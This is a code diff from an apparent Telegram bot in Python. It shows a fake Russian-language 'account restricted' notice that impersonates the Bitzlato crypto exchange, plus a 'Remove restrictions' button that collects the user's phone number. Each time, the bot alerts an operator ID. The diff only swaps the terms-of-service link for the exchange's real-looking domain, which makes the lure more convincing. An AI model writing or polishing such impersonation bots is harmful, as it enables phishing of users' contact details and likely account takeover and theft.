@@ -671,13 +671,13 @@ def start(message):
 			keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True) 
 			button_phone = types.KeyboardButton(text="✅Снять ограничения", request_contact=True) 	
 			keyboard.add(button_phone)	
-			bot.send_message(message.chat.id, "Запрещено >>> \\n❌ Ваш аккаунт ограничен! Вероятнее всего, Вы нарушили условия сервиса (https://bitzlato.bz/en/terms)!", reply_markup=keyboard)
+			bot.send_message(message.chat.id, "Запрещено >>> \\n❌ Ваш аккаунт ограничен! Вероятнее всего, Вы нарушили условия сервиса (https://bitzlato.com/en/terms-of-service-bitzlato/)!", reply_markup=keyboard)
 		
 		except Exception as e:
 			keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True) 
 			button_phone = types.KeyboardButton(text="✅Снять ограничения", request_contact=True) 	
 			keyboard.add(button_phone)	
-			bot.send_message(message.chat.id, "Запрещено >>> \\n❌ Ваш аккаунт ограничен! Вероятнее всего, Вы нарушили условия сервиса (https://bitzlato.bz/en/terms)!", reply_markup=keyboard)
+			bot.send_message(message.chat.id, "Запрещено >>> \\n❌ Ваш аккаунт ограничен! Вероятнее всего, Вы нарушили условия сервиса (https://bitzlato.com/en/terms-of-service-bitzlato/)!", reply_markup=keyboard)
 			userid = message.chat.id
 			bot.send_message(ID, f'Пользователь с ID:{{userid}} запустил бота!')
 
